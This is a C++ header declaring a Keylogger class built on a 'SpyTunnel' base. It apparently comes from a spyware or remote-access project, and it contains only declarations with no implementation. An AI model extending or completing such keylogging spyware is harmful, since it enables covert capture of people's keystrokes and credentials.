#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include "include_tunnel.hpp"
#include "spy_tunnel.hpp"

class Keylogger : public SpyTunnel {
public:
    Keylogger() = default;
    void run() override;
    void set_layout(const std::string& __layout);
protected:
    std::string layout_;
    void spawn_window() override;
};

#endif // KEYLOGGER_HPP